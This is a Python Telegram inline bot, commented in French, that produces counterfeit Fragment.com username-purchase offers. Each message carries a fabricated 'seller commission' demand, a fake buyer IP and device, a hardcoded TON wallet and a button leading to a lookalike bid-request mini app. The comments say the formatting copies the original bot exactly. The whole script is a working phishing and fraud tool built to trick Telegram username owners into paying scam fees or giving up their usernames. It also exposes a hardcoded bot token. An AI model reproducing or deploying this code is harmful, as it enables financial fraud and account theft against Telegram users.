import os
import time
import urllib.request
import json
import logging
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup, MessageEntity, InlineQueryResultArticle, InputTextMessageContent
from telegram.ext import Application, InlineQueryHandler, ContextTypes

# Configuration
BOT_TOKEN = '7975400880:AAFMJ5ya_sMdLLMb7OjSbMYiBr3IhZikE6c'
PORT = int(os.getenv('PORT', 10000))
WEBHOOK_URL = "https://telegram-bot-vic3.onrender.com"

# Configuration du logging
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)
logger = logging.getLogger(__name__)

print(f"🤖 Inline Fragment Deal Generator v4.0")
print(f"🔑 Token: ✅")
print(f"🌐 Port: {PORT}")
print(f"🔗 Webhook: {WEBHOOK_URL}")

def get_ton_price():
    """Récupère le prix du TON"""
    try:
        url = "https://api.diadata.org/v1/assetQuotation/Ton/0x0000000000000000000000000000000000000000"
        with urllib.request.urlopen(url, timeout=5) as response:
            data = json.loads(response.read().decode())
            return float(data.get('Price', 5.50))
    except Exception as e:
        logger.error(f"Erreur récupération prix TON: {e}")
        return 5.50

def generate_fragment_message(username, ton_amount):
    """Génère le message Fragment avec formatage identique au bot original"""
    
    # Prix TON actuel
    ton_price = get_ton_price()
    
    # Calculs
    price = float(ton_amount)
    price_usd = price * ton_price
    commission = price * 0.05
    commission_usd = commission * ton_price
    
    # Adresse wallet
    wallet_address = "UQBBlxK8VBxEidbxw4oQVyLSk7iEf9VPJxetaRQpEbi-XDPR"
    
    # Message Fragment avec formatage en gras - IDENTIQUE au bot original
    fragment_message = f"""We have received a purchase request for your username @{username} via Fragment.com. Below are the transaction details:

• Offer Amount: 💎{price:g} (${price_usd:.2f} USD)
• Commission: 💎{commission:g} (${commission_usd:.2f} USD)

Please note that a 5% commission is charged to the seller prior to accepting the deal. This ensures a secure and efficient transaction process.

Additional Information:
• Device: Safari on macOS  
• IP Address: 103.56.72.245
• Wallet: {wallet_address}

Important:
• Please proceed only if you are willing to transform your username into a collectible. This action is irreversible.
• If you choose not to proceed, simply ignore this message."""
    
    # DEBUG: Affichage du message pour debug
    print("📝 Fragment message:")
    print(repr(fragment_message))
    print(f"📏 Message length: {len(fragment_message)}")
    print(f"💼 Wallet address: '{wallet_address}' (length: {len(wallet_address)})")
    
    # Création des entités pour le formatage
    entities = []
    
    # 1. Offer Amount en gras
    offer_text = f"• Offer Amount: 💎{price:g} (${price_usd:.2f} USD)"
    offer_start = fragment_message.find(offer_text)
    if offer_start != -1:
        entities.append(MessageEntity(
            type=MessageEntity.BOLD,
            offset=offer_start,
            length=len(offer_text)
        ))
        print(f"✅ Offer Amount: position {offer_start}, length {len(offer_text)}")
    
    # 2. Commission en gras
    commission_text = f"• Commission: 💎{commission:g} (${commission_usd:.2f} USD)"
    commission_start = fragment_message.find(commission_text)
    if commission_start != -1:
        entities.append(MessageEntity(
            type=MessageEntity.BOLD,
            offset=commission_start,
            length=len(commission_text)
        ))
        print(f"✅ Commission: position {commission_start}, length {len(commission_text)}")
    
    # 3. Premier point Important en gras
    important_text1 = "• Please proceed only if you are willing to transform your username into a collectible. This action is irreversible."
    important_start1 = fragment_message.find(important_text1)
    if important_start1 != -1:
        entities.append(MessageEntity(
            type=MessageEntity.BOLD,
            offset=important_start1,
            length=len(important_text1)
        ))
        print(f"✅ Important 1: position {important_start1}, length {len(important_text1)}")
    
    # 4. Deuxième point Important en gras
    important_text2 = "• If you choose not to proceed, simply ignore this message."
    important_start2 = fragment_message.find(important_text2)
    if important_start2 != -1:
        entities.append(MessageEntity(
            type=MessageEntity.BOLD,
            offset=important_start2,
            length=len(important_text2)
        ))
        print(f"✅ Important 2: position {important_start2}, length {len(important_text2)}")
    
    # 5. Wallet cliquable - CORRECTION ICI
    wallet_start = fragment_message.find(wallet_address)
    if wallet_start != -1:
        # Vérification debug
        actual_wallet_text = fragment_message[wallet_start:wallet_start + len(wallet_address)]
        print(f"🔍 Wallet found at position {wallet_start}")
        print(f"🔍 Expected wallet: '{wallet_address}'")
        print(f"🔍 Actual wallet text: '{actual_wallet_text}'")
        print(f"🔍 Match: {actual_wallet_text == wallet_address}")
        
        entities.append(MessageEntity(
            type=MessageEntity.TEXT_LINK,
            offset=wallet_start,
            length=len(wallet_address),  # longueur exacte de l'adresse
            url=f"https://tonviewer.com/{wallet_address}"
        ))
        print(f"✅ Wallet link: position {wallet_start}, length {len(wallet_address)}")
    else:
        print("❌ Wallet address not found in message!")
    
    # URL du bouton - identique au bot original
    button_url = f"https://t.me/BidRequestApp_bot/?startapp={username.lower()}-{price:g}"
    
    # Bouton - identique au bot original
    keyboard = InlineKeyboardMarkup([[InlineKeyboardButton("View details", url=button_url)]])
    
    return fragment_message, entities, keyboard

async def inline_query_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Gestionnaire des requêtes inline"""
    query = update.inline_query.query
    
    # Instructions par défaut si pas de requête
    if not query:
        results = [
            InlineQueryResultArticle(
                id="help",
                title="📝 Comment utiliser ce bot",
                description="Tapez: username montant_ton",
                input_message_content=InputTextMessageContent(
                    "ℹ️ **Utilisation du bot:**\n\nTapez: `@BidRequestMiniApp_bot username montant_ton`\n\n**Exemple:** `@BidRequestMiniApp_bot johndoe 150`",
                    parse_mode="Markdown"
                )
            )
        ]
        await update.inline_query.answer(results, cache_time=0)
        return
    
    # Parsing de la requête (username montant)
    parts = query.strip().split()
    
    if len(parts) < 2:
        results = [
            InlineQueryResultArticle(
                id="error",
                title="❌ Format incorrect",
                description="Format attendu: username montant_ton",
                input_message_content=InputTextMessageContent(
                    "❌ **Format incorrect**\n\nUtilisez: `username montant_ton`\n\n**Exemple:** `johndoe 150`",
                    parse_mode="Markdown"
                )
            )
        ]
        await update.inline_query.answer(results, cache_time=0)
        return
    
    username = parts[0].replace('@', '')  # Supprime @ si présent
    
    try:
        ton_amount = float(parts[1])
        if ton_amount <= 0:
            raise ValueError("Montant doit être positif")
    except ValueError:
        results = [
            InlineQueryResultArticle(
                id="error_amount",
                title="❌ Montant invalide",
                description="Le montant doit être un nombre positif",
                input_message_content=InputTextMessageContent(
                    "❌ **Montant invalide**\n\nLe montant en TON doit être un nombre positif.\n\n**Exemple:** `johndoe 150`",
                    parse_mode="Markdown"
                )
            )
        ]
        await update.inline_query.answer(results, cache_time=0)
        return
    
    # Génération du message avec le format exact du bot original
    fragment_message, entities, keyboard = generate_fragment_message(username, ton_amount)
    
    # Résultat inline
    results = [
        InlineQueryResultArticle(
            id=f"deal_{username}_{ton_amount}",
            title=f"Fragment Deal: @{username}",
            description=f"💎 {ton_amount:g} TON (${ton_amount * get_ton_price():.2f} USD)",
            input_message_content=InputTextMessageContent(
                fragment_message,
                entities=entities
            ),
            reply_markup=keyboard
        )
    ]
    
    await update.inline_query.answer(results, cache_time=0)
    logger.info(f"✅ Requête inline traitée: {username} - {ton_amount} TON")

def main():
    """Fonction principale"""
    global app
    
    # Création de l'application
    app = Application.builder().token(BOT_TOKEN).build()
    
    # Ajout du gestionnaire inline
    app.add_handler(InlineQueryHandler(inline_query_handler))
    
    # Configuration webhook pour Render
    if os.getenv('RENDER'):
        logger.info("🚀 Démarrage en mode webhook (Render)")
        app.run_webhook(
            listen="0.0.0.0",
            port=PORT,
            webhook_url=f"{WEBHOOK_URL}/{BOT_TOKEN}",
            url_path=BOT_TOKEN
        )
    else:
        # Mode polling pour développement local
        logger.info("🔄 Démarrage en mode polling (local)")
        app.run_polling(allowed_updates=["inline_query"])

if __name__ == '__main__':
    main()
